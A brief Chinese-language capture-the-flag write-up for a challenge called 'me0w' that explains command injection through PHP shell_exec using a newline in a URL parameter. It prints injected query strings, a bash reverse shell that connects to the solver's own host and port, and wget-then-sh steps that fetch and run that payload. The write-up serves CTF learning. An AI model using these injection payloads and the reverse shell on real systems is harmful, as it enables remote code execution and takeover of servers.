# me0w [50]

這一題利用 php 的 shell\_exec 函式遇到換行符號會執行新指令的特性。
像是題目中使用

```
shell_exec("cat $me0w &> /dev/null");
```

如果在 me0w 中塞 

```
?me0w=%0asleep%205  (%0a 是換行符號，%20是)空格)
```

系統會暫停 5 秒

所以這題將 payload 放在一個遠端的 server 來達到 RCE。payload 內容大致為(host, port 為自己server的路徑)

```
bash -c 'bash -i >& /dev/tcp/host/port 0>&1'
```

之後用 me0w 下載 payload 後執行

```
?me0w=%0awget%20{payload_address}%20-O%20{save_file}
?me0w=%0ash%20{save_file}
```

